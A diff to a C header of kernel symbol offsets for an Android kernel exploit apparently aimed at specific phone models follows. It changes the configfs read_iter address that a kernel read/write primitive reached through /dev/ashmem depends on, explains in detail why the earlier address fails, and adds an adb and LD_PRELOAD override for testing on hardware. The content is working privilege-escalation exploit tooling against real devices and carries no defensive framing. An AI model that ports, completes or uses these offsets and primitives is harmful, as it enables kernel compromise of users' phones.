@@ -138,10 +138,38 @@
 #define ASHMEM_OPEN_OFF 0x00c9b9e0ULL
 #define ASHMEM_RELEASE_OFF 0x00c9ba68ULL
 #define ASHMEM_SHOW_FDINFO_OFF 0x00c9baf4ULL
-/* the *bin* variant: paired with configfs_bin_write_iter. A separate
- * configfs_read_iter also exists at 0x0049f8ec — do not confuse them. */
-#define CONFIGFS_READ_ITER_OFF 0x0049fc10ULL
+/* The read side is the *plain* configfs_read_iter and the write side is the
+ * *bin* one; that asymmetry is deliberate, because it is what the two halves of
+ * the primitive are shaped for. configfs_read_once() sets buffer->page and
+ * relies on buffer->count already holding the ashmem name prefix
+ * (ASHMEM_PREFIX_COUNT), which is configfs_read_iter's contract;
+ * configfs_write_once() sets bin_buffer/bin_buffer_size/cb_max_size, which is
+ * configfs_bin_write_iter's. docs/PORTING.md names configfs_read_iter for this
+ * define, and the Samsung profiles follow it.
+ *
+ * This carried 0x0049fc10 — configfs_bin_read_iter — until it was checked
+ * against the image. Both tables are in there and settle it:
+ *
+ *   configfs_file_operations     @0x118a4c0  llseek=generic_file_llseek
+ *                                            read_iter=0x0049f8ec
+ *   configfs_bin_file_operations @0x118a5c8  llseek=NULL
+ *                                            read_iter=0x0049fc10
+ *
+ * The bin variant cannot serve the read primitive twice over: it derefs
+ * to_frag(file) == file->f_path.dentry->d_fsdata->s_frag unconditionally at
+ * +0x3c, above mutex_lock, and /dev/ashmem* is a tmpfs dentry whose d_fsdata is
+ * a small directory offset rather than a configfs_dirent; and even past that it
+ * copies from bin_buffer/bin_buffer_size, which the read blob leaves zero, so it
+ * would return 0 bytes. configfs_read_iter reaches the same to_frag chain only
+ * inside the needs_read_fill branch, which the blob sets to 0 and skips.
+ * See docs/PMG110-16.0.9.400.md. */
+#define CONFIGFS_READ_ITER_OFF 0x0049f8ecULL
 #define CONFIGFS_BIN_WRITE_ITER_OFF 0x0049fe18ULL
+/* Until a run on hardware confirms the above, this profile can be told to use
+ * the other address without a rebuild:
+ *     adb shell CONFIGFS_READ_ITER_OFF=0x0049fc10 LD_PRELOAD=... /system/bin/true
+ * Gated per target so the Samsung profiles still build byte-identically. */
+#define CONFIGFS_READ_ITER_ENV_OVERRIDE 1
 #define COPY_SPLICE_READ_OFF 0x004235e0ULL
 #define NOOP_LLSEEK_OFF 0x003d6340ULL
 #define INIT_TASK_OFF 0x0213e780ULL
